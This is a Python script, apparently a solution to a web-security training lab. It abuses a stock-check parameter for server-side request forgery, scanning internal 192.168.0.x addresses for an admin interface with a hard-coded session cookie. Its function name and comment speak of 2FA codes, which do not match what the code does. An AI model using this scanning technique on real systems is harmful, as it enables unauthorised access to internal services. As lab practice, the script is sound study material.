import requests
import time

URL = 'https://ac6d1fca1f74d722c1482f2b00be00a7.web-security-academy.net/product/stock'


def get_2fa_code(session):
    for number in range(1, 256):
        # time.sleep(0.5)
        response = requests.post(URL, cookies={'session': session}, data={'stockApi': f'http://192.168.0.{number}:8080/admin'})
        print(response.status_code)
        if response.status_code == 200:
            print(f"IP is http://192.168.0.{number}:8080")
            break


if __name__ == '__main__':
    # Modify the verify cookie to make sure that a 2FA code is sent to the victim
    session_cookie = 'XJvLpaChqKqol10PtSNAOFwavyZMsax3'
    get_2fa_code(session_cookie)
